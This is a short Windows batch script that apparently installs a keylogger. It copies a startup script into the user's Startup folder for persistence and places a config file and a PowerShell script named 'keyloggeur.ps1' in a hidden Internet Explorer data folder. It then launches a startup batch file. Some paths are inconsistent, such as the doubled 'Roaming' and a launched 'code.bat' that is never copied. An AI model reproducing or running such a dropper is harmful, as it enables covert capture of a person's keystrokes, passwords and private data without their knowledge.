@echo off
mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "config.json" "%APPDATA%/Roaming/Microsoft/Internet Explorer/UserData/Low/"
copy "keyloggeur.ps1" "%APPDATA%/Roaming/Microsoft/Internet Explorer/UserData/Low/"

echo terminer
start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\code.bat"